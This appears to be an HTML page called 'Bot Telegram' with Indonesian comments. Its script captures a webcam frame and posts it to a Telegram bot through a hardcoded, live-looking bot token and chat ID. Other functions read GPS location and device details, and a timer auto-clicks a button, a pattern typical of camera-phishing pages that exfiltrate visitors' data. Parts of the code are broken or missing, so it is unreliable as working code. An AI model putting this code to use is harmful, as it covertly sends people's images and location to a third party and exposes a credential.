<!DOCTYPE html>
<html>
<head>
    <title>Bot Telegram</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h1>Bot Telegram</h1>
    <video id="videoElement" width="640" height="480" autoplay></video>
    <button onclick="capturePhoto()">Ambil Foto</button>
    <button onclick="sendPhoto()">Kirim Foto</button>

    <script>
        // Mengambil foto dari video element
        function capturePhoto() {
            var videoElement = document.getElementById('videoElement');
            var canvas = document.createElement('canvas');
            var context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            var dataURL = canvas.toDataURL('image/jpeg');
            sendPhotoToTelegram(dataURL);
        }

        // Mengirim foto ke bot Telegram menggunakan HTTP API
        function sendPhotoToTelegram(photoData) {
            // Ganti 'YOUR_BOT_TOKEN' dengan token bot Telegram Anda
            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
            // Ganti 'YOUR_CHAT_ID' dengan ID chat Anda
            var chatId = '1121369247';

            // Membuat objek FormData dan menambahkan data foto
            var formData = new FormData();
            formData.append('photo', photoData);

            // Mengirim permintaan AJAX ke HTTP API Telegram
            $.ajax({
                url: 'https://api.telegram.org/bot' + botToken + '/sendPhoto?chat_id=' + chatId,
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
                success: function (response) {
                    console.log('Foto berhasil dikirim ke Telegram!');
                },
                error: function (xhr, status, error) {
                    console.error('Gagal mengirim foto ke Telegram: ' + error);
                }
            });
        }

        // Mengambil lokasi menggunakan GPS
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                console.error('Geolocation tidak didukung oleh browser Anda.');
            }
        }

        // Menampilkan lokasi saat ini pada peta
        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var mapUrl = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
            window.open(mapUrl, '_blank');
        }

        // Mengambil informasi perangkat dan browser
        function getDeviceInfo() {
            var deviceInfo = '';
            deviceInfo += 'User Agent: ' + navigator.userAgent + '\n';
            deviceInfo += 'Battery Level: ' + navigator.getBattery().level * 100 + '%\n';
            // Tambahkan informasi lainnya yang Anda perlukan

            alert(deviceInfo);
        }

        // Klik otomatis pada button setelah 3 detik
        function autoClickButton() {
            setTimeout(function () {
                var button = document.getElementById('buttonId');
                button.click();
            }, 3000);
        }
    </script>
</body>
</html>
